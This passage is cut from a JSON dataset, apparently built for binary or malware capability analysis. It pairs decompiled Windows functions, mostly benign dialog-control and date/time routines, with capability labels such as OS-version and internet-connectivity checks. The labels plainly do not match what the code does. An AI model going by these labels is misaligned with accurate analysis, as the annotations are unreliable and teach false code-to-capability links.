        "decompiled_code": "\nint32_t __cdecl fcn.0042c11c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar1 = arg_8h;\n    fcn.00422473(arg_8h, &arg_8h);\n    if (arg_8h == 0) {\n        iVar2 = fcn.004223f2(iVar1);\n        if (iVar2 == 0) {\n            fcn.00419000();\n        }\n    }\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 8) = iVar1;\n    return arg_8h;\n}\n",
        "token_count": 157
    },
    "0042c15b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c15b(int32_t *param_1)\n\n{\n    int32_t *hWnd;\n    \n    hWnd = param_1;\n    if ((*param_1 != 0) && (param_1[2] != 0)) {\n        fcn.00422473(param_1[2], &hWnd);\n        if (hWnd != NULL) {\n            (*_sym.imp.USER32.dll_SetFocus)(hWnd);\n            if (param_1[3] != 0) {\n                (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0xb1, 0, 0xffffffff);\n            }\n        }\n    }\n    fcn.004198cf();\n    return;\n}\n",
        "token_count": 159
    },
    "0042c1aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c1aa(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = arg_8h;\n    fcn.0042c11c(arg_ch);\n    fcn.00422473(arg_ch, &arg_8h);\n    if (*piVar1 == 0) {\n        if ((*arg_10h < 0) || (2 < *arg_10h)) {\n            *arg_10h = 0;\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0xf1, *arg_10h, 0);\n    }\n    else {\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0xf0, 0, 0);\n        *arg_10h = iVar2;\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "0042c360": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c360(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    \n    piVar1 = arg_8h;\n    fcn.0042c11c(arg_ch);\n    fcn.00422473(arg_ch, &arg_8h);\n    if (*piVar1 == 0) {\n        (*_sym.imp.USER32.dll_SetScrollPos)(arg_8h, 2, *arg_10h, 1);\n    }\n    else {\n        uVar2 = (*_sym.imp.USER32.dll_GetScrollPos)(arg_8h, 2);\n        *arg_10h = uVar2;\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "0042c44f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c44f(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = arg_14h;\n    uVar2 = arg_10h;\n    if ((*arg_8h != 0) || ((arg_10h <= arg_ch && (arg_ch <= arg_14h)))) {\n        fcn.00422473(arg_8h[2], &arg_ch);\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n        (*_sym.imp.USER32.dll_SendMessageA)(arg_ch, 0x407, 0, uVar2);\n        (*pcVar1)(arg_ch, 0x408, 1, uVar3);\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "0042c4a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c4a1(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = arg_10h;\n    if (*(arg_10h + 0x20) != 0) {\n        return;\n    }\n    iVar1 = fcn.004223d0();\n    if (iVar1 != 0) {\n        return;\n    }\n    fcn.0042c11c(arg_ch);\n    fcn.00422473(arg_ch, &arg_10h);\n    if (arg_10h != 0) {\n        iVar1 = fcn.0041f64b(arg_10h);\n        if (iVar1 == 0) {\n            fcn.00419000();\n        }\n        if (arg_10h != 0) {\n            iVar1 = *(arg_8h + 4);\n            iVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar2 + 0x20));\n            if (*(iVar1 + 0x20) == iVar2) {\n                return;\n            }\n            arg_ch = 0;\n            goto code_r0x0042c51c;\n        }\n    }\n    iVar2 = fcn.004223f2(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar1 = *(arg_8h + 4);\ncode_r0x0042c51c:\n    fcn.0042281e(iVar1, arg_ch);\n    return;\n}\n",
        "token_count": 348
    },
    "0042c541": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c541(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint unaff_EDI;\n    uint var_48h;\n    uint lpString;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.0042c52a(arg_ch);\n    uVar1 = arg_18h;\n    if (*arg_8h == 0) {\n        puVar3 = fcn.0045924d();\n        uVar1 = *puVar3;\n        puVar3 = fcn.0045924d();\n        *puVar3 = 0;\n        fcn.00458160(&lpString, 0x40, 0x3f, arg_10h, &arg_18h);\n        piVar4 = fcn.0045924d();\n        if (*piVar4 == 0) {\n            puVar3 = fcn.0045924d();\n            *puVar3 = uVar1;\n        }\n        else {\n            puVar3 = fcn.0045924d();\n            fcn.00418055(*puVar3);\n        }\n        fcn.00431d30(arg_8h_00, &lpString);\n    }\n    else {\n        (*_sym.imp.USER32.dll_GetWindowTextA)(arg_8h_00, &lpString, 0x40);\n        iVar2 = fcn.0045cb78(&lpString, 0x40, arg_10h, uVar1);\n        if (iVar2 != 1) {\n            fcn.004268c4(arg_14h, 0, 0xffffffff);\n            fcn.0042c15b();\n        }\n    }\n    fcn.004566a8(unaff_EDI);\n    return;\n}\n",
        "token_count": 471
    },
    "0042c604": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c604(int32_t *arg_8h, uint arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t *puVar1;\n    \n    puVar1 = arg_10h;\n    arg_10h = *arg_10h;\n    if (*arg_8h == 0) {\n        fcn.0042c541(arg_8h, arg_ch, 0x48e24c, 0xf116, arg_10h);\n    }\n    else {\n        fcn.0042c541(arg_8h, arg_ch, 0x48e24c, 0xf116, &arg_10h);\n        if (0xff < arg_10h) {\n            fcn.004268c4(0xf116, 0, 0xffffffff);\n            fcn.0042c15b();\n        }\n        *puVar1 = arg_10h;\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "0042c675": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c675(int32_t *arg_8h, uint arg_ch, int16_t *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.0042c541(arg_8h, arg_ch, 0x48e250, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 97
    },
    "0042c6a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c6a6(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.0042c541(arg_8h, arg_ch, 0x48e254, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 97
    },
    "0042c6d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c6d5(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.0042c541(arg_8h, arg_ch, 0x48e24c, 0xf117, arg_10h);\n    return;\n}\n",
        "token_count": 98
    },
    "0042c704": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c704(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.0042c541(arg_8h, arg_ch, 0x48e258, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 95
    },
    "0042c733": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c733(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.0042c541(arg_8h, arg_ch, 0x48e25c, 0xf117, arg_10h);\n    return;\n}\n",
        "token_count": 96
    },
    "0042c762": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c762(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        fcn.0042c541(arg_8h, arg_ch, \"%I64d\", 0xf110, *arg_10h);\n    }\n    else {\n        fcn.0042c541(arg_8h, arg_ch, \"%I64d\", 0xf110, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "0042c7aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c7aa(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        fcn.0042c541(arg_8h, arg_ch, \"%I64u\", 0xf117, *arg_10h);\n    }\n    else {\n        fcn.0042c541(arg_8h, arg_ch, \"%I64u\", 0xf117, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "0042c7f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c7f2(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.0042c52a(arg_ch);\n    if (*arg_8h == 0) {\n        fcn.00431d30(arg_8h_00, arg_10h);\n    }\n    else {\n        (*_sym.imp.USER32.dll_GetWindowTextLengthA)(arg_8h_00);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(arg_8h_00, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "0042cc88": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cc88(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h_00 = fcn.0042c52a(arg_ch);\n    if (*arg_8h == 0) {\n        fcn.00431d30(arg_8h_00, *arg_10h);\n    }\n    else {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(arg_8h_00);\n        uVar2 = fcn.00417552(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(arg_8h_00, uVar2);\n        fcn.00410110(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "0042ccda": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ccda(int32_t *hWnd, uint arg_ch, uint *lParam)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    piVar2 = hWnd;\n    fcn.0042c11c(arg_ch);\n    fcn.00422473(arg_ch, &hWnd);\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*piVar2 == 0) {\n        (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x18c, 0xffffffff, *lParam);\n    }\n    else {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x188, 0, 0);\n        if (iVar3 == -1) {\n            fcn.004016d0();\n        }\n        else {\n            uVar4 = (*pcVar1)(hWnd, 0x18a, iVar3, 0);\n            uVar4 = fcn.00417552(uVar4);\n            (*pcVar1)(hWnd, 0x189, iVar3, uVar4);\n        }\n        fcn.00410110(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "0042cd6e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cd6e(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *hWnd;\n    int32_t iVar2;\n    \n    hWnd = arg_8h;\n    fcn.0042c11c(arg_ch);\n    fcn.00422473(arg_ch, &arg_8h);\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*hWnd == 0) {\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x1a2, 0xffffffff, *arg_10h);\n        if (-1 < iVar2) {\n            (*pcVar1)(arg_8h, 0x186, iVar2, 0);\n        }\n    }\n    else {\n        fcn.0042ccda(hWnd, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "0042cdce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cdce(int32_t *hWnd, uint arg_ch, uint *lParam)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    piVar1 = hWnd;\n    fcn.0042c11c(arg_ch);\n    fcn.00422473(arg_ch, &hWnd);\n    puVar2 = lParam;\n    if (*piVar1 == 0) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x14d, 0xffffffff, *lParam);\n        if (iVar3 == -1) {\n            fcn.00431d30(hWnd, *puVar2);\n        }\n    }\n    else {\n        iVar3 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(hWnd);\n        if (iVar3 < 1) {\n            uVar4 = fcn.00401940(0xff);\n            iVar3 = 0x100;\n        }\n        else {\n            uVar4 = fcn.00417552(iVar3, iVar3 + 1);\n        }\n        (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, uVar4, iVar3);\n        fcn.00410110(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 293
    },
    "0042ce60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ce60(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *hWnd;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    hWnd = arg_8h;\n    fcn.0042c11c(arg_ch);\n    fcn.00422473(arg_ch, &arg_8h);\n    puVar2 = arg_10h;\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*hWnd == 0) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x158, 0xffffffff, *arg_10h);\n        if (iVar3 < 0) {\n            fcn.00431d30(arg_8h, *puVar2);\n        }\n        else {\n            (*pcVar1)(arg_8h, 0x14e, iVar3, 0);\n        }\n    }\n    else {\n        fcn.0042cdce(hWnd, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "0042d31c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042d31c(ulong *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if ((*(param_1 + 1) == 0) && (iVar1 = (*_sym.imp.OLEAUT32.dll_UnRegisterTypeLib)(*param_1, param_2),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "0042d4d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d4d7(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint lParam;\n    uint var_10h;\n    \n    uVar2 = 0;\n    if ((arg_8h != 0) && (*(arg_8h + 8) != 2)) {\n        cVar1 = fcn.0042d31c(&lParam);\n        if (cVar1 != '\\0') {\n            uVar2 = 1;\n        }\n    }\n    if ((arg_ch != 0) && (*(arg_ch + 8) != 2)) {\n        cVar1 = fcn.0042d31c(&var_10h);\n        if (cVar1 != '\\0') {\n            uVar2 = uVar2 | 2;\n        }\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1004, uVar2, &lParam);\n    return;\n}\n",
        "token_count": 244
    },
    "0042d534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d534(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint uVar2;\n    uint lParam;\n    \n    uVar2 = 1;\n    if (*(arg_8h + 8) == 0) {\n        cVar1 = fcn.0042d31c(&lParam);\n        if (cVar1 != '\\0') {\n            uVar2 = 0;\n        }\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1002, uVar2, &lParam);\n    return;\n}\n",
        "token_count": 149
    },
    "0042d7d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d7d1(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint lParam;\n    uint var_10h;\n    \n    uVar2 = 0;\n    if ((arg_8h != 0) && (*(arg_8h + 8) != 2)) {\n        cVar1 = fcn.0042d31c(&lParam);\n        if (cVar1 != '\\0') {\n            uVar2 = 1;\n        }\n    }\n    if ((arg_ch != 0) && (*(arg_ch + 8) != 2)) {\n        cVar1 = fcn.0042d31c(&var_10h);\n        if (cVar1 != '\\0') {\n            uVar2 = uVar2 | 2;\n        }\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1012, uVar2, &lParam);\n    return;\n}\n",
        "token_count": 244
    },
    "0042d96c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042d96c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint var_24h;\n    uint var_14h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if ((((*(arg_8h + 8) == 0) && (*(arg_ch + 8) == 0)) && (cVar1 = fcn.0042d31c(&var_24h),  cVar1 != '\\0')) &&\n       (cVar1 = fcn.0042d31c(&var_14h),  cVar1 != '\\0')) {\n        var_4h = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1006, 0, &var_24h);\n    }\n    return var_4h;\n}\n",
        "token_count": 210
    },
    "0042da81": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042da81(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    uVar1 = fcn.0042c11c(arg_ch);\n    iVar2 = fcn.0041e67e(uVar1);\n    if (iVar2 == 0) {\n        fcn.0041901a();\n    }\n    if (*arg_8h == 0) {\n        (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(arg_10h, &var_10h);\n        fcn.0042ceff(&var_10h);\n    }\n    else {\n        (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x20), 0x1001, 0);\n        (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&var_10h, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "0042db23": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042db23(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    uVar1 = fcn.0042c11c(arg_ch);\n    iVar2 = fcn.0041e67e(uVar1);\n    if (iVar2 == 0) {\n        fcn.0041901a();\n    }\n    if (*arg_8h == 0) {\n        (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(arg_10h, &var_10h);\n        (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x20), 0x1002, 0, &var_10h);\n    }\n    else {\n        fcn.0042d3d9();\n        (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&var_10h, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0042dbc5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dbc5(int32_t *arg_8h, uint *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0042244f(arg_8h[2]);\n    if (*arg_8h == 0) {\n        if ((arg_10h != 0) && (cVar1 = fcn.0042d284(*arg_ch, arg_ch[1]),  cVar1 != '\\0')) {\n            return;\n        }\n        if ((arg_14h != 0) && (cVar1 = fcn.0042d267(*arg_ch, arg_ch[1]),  cVar1 != '\\0')) {\n            return;\n        }\n    }\n    if (iVar2 == 0) {\n        fcn.0041901a();\n    }\n    fcn.0042d486(arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 225
    },
    "0042dc2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dc2c(int32_t *arg_8h, uint *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0042244f(arg_8h[2]);\n    if (*arg_8h == 0) {\n        if ((arg_10h != 0) && (cVar1 = fcn.0042d284(*arg_ch, arg_ch[1]),  cVar1 != '\\0')) {\n            return;\n        }\n        if ((arg_14h != 0) && (cVar1 = fcn.0042d267(*arg_ch, arg_ch[1]),  cVar1 != '\\0')) {\n            return;\n        }\n    }\n    if (iVar2 == 0) {\n        fcn.0041901a();\n    }\n    fcn.0042d82e(arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 227
    },
    "0042dcb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042dcb0(ulong *arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    ulong *in_ECX;\n    float10 fVar2;\n    float10 fVar3;\n    \n    if ((*(in_ECX + 1) == 0) && (*(arg_8h + 1) == 0)) {\n        fVar2 = fcn.0042d350(*in_ECX);\n        fVar3 = fcn.0042d350(*arg_8h);\n        if (((fVar3 < fVar2) << 8 | (fVar3 == fVar2) << 0xe) == 0) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n    }\n    else {\n        uVar1 = in_EAX & 0xffffff00;\n    }\n    return uVar1;\n}\n",
        "token_count": 211
    },
    "0042dcfa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
